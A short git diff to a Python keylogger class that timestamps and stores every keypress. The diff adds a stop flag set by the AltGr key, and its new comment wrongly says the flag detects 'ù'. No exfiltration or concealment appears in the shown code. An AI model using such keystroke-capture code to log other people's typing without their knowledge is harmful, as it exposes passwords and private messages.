@@ -10,15 +10,19 @@ class KeyLogger:
         """The builder of the 'KeyLogger' class
 
         Class for creating keyloggers and controlling them.
+        'stopMain' is a boolean which detect the 'ù' and stop the main.py process
         A keylogger stores the received input logs in a 'a_keys' list.
         The 'listener' attribute will allow us to listen to the keyboard.
 
         """
+        self.a_stopMain = True
         self.a_keys = []
         self.a_listener = keyboard.Listener(on_press=self.on_press)
 
     def on_press(self,p_key):
         """Fills the list with a time and the key pressed."""
+        if(p_key == keyboard.Key.alt_gr):
+            self.a_stopMain = False
         log = ( datetime.now().time(), p_key )
         self.a_keys.append(log)
     
